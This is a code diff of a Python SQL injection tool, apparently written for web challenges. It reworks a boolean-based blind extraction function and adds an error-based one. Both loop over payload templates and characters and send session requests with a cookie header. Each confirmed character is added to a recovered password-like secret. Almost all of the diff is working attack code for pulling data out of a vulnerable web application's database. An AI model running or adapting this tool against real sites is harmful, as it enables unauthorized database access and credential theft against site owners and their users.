@@ -13,8 +13,9 @@ header = {
 }
 print(cookie)
 
+
 # Brute force cheatsheet.txt Method Get
-def Get_Easy_Bf(p): 
+def Get_Easy_Bf(p):
     f = open("cheatsheet.txt" , "r")   
     get = session.get(url = url , headers=header)
     len_r = len(get.text)
@@ -41,50 +42,57 @@ def Filter(p , list_filter):
 
 #Get boolean with payload
 def Get_Boolean(p):
-    while(True):
-        print("1.test length")
-        print("2.brute force")
-        choose = int(input("your choice : "))
-        if choose == 1:
-            f2 = open("length.txt" , "r")
-            list = []
-            for ch in f2:
-                print(ch)
-                list.append(ch)
-            user_ch = int(input("your choice : "))
-            s_p = input("Sepecial params : ")
-            for i in range (0,25):
-                pw  = list[user_ch].replace("{pw}",s_p).replace("{i}",str(i))
-                get = session.get(url = url , headers=header , params={p : pw[2:]} )
-                print(len(get.text) , pw)
-            f2.close()
-        elif choose == 2:
-            f1 = open("boolean.txt" , "r")
-            list=[]        
-            for ch in f1:                
-                print(ch)
-                list.append(ch)
-            print("99. custom payload")           
-            user_ch = int(input("your choice : "))            
-            if user_ch == 99:
-                pw_choose = "1." + input("payload : ")
-            else:
-                pw_choose = list[user_ch]
-            sp = input("special: ")
-            len_pw = int(input("length :"))
-            password = ""
-            s_p = input("Sepecial params : ")
-            for i in range(1,len_pw):
-                for j in char:
-                    pass_1 = password + j
-                    pw  = pw_choose.replace("{pw}",s_p).replace("{i}",str(i)).replace("{j}" , pass_1).replace("\n","")
-                    get = session.get(url = url , headers=header , params=f"{p}={pw[2:]}")            
-                    if (sp in get.text):
-                        print(len(get.text) , pw[2:] ,get.url)                      
-                        password = password + j
-                        print(password)
-                        break
-            f1.close()
+    f1 = open("boolean.txt" , "r")
+    list=[]        
+    for ch in f1:                
+        print(ch)
+        list.append(ch)
+    print("99. custom payload")           
+    user_ch = int(input("your choice : "))            
+    if user_ch == 99:
+        pw_choose = "1." + input("payload : ")
+    else:
+        pw_choose = list[user_ch]
+    sp = input("special: ")
+    len_pw = int(input("length :"))
+    password = ""
+    s_p = input("Sepecial params : ")
+    for i in range(1,len_pw):
+        for j in char:
+            pass_1 = password + j
+            pw  = pw_choose.replace("{pw}",s_p).replace("{i}",str(i)).replace("{j}" , pass_1).replace("\n","")
+            get = session.get(url = url , headers=header , params=f"{p}={pw[2:]}")            
+            if (sp in get.text):
+                print(len(get.text) , pw[2:] ,get.url)                      
+                password = password + j
+                print(password)
+                break
+    f1.close()
+
+
+#Get Error-based sql
+def Get_Error_based(p):
+    f1 = open("error-based.txt", "r")
+    list=[]        
+    for ch in f1:                
+        print(ch)
+        list.append(ch)
+    user_ch = int(input("your choose : "))
+    sp = input("special: ")
+    len_pw = int(input("length :"))
+    password = ""
+    s_p = input("Sepecial params : ")
+    for i in range(1, len_pw):
+        for j in char:
+            pw = list[user_ch].replace("{pw}", s_p).replace("{i}", str(i)).replace("{j}", str(ord(j))).replace("\n", "")
+            get = session.get(url=url, headers=header, params=f"{p}={pw[2:]}")
+            print( get.url , get.status_code)
+            if (sp in get.text):
+                print(len(get.text), pw[2:], get.url)
+                password = password + j
+                print(password)
+                break
+    f1.close()
 
 #Get Payload have filter replace
 def Get_Filter(list_filter):
@@ -112,6 +120,7 @@ def Get_Filter(list_filter):
                 print("payload : " , payload)
                 break
         break
+
 
 #Post Brute Force Data
 def Post_Easy_Bf(data):
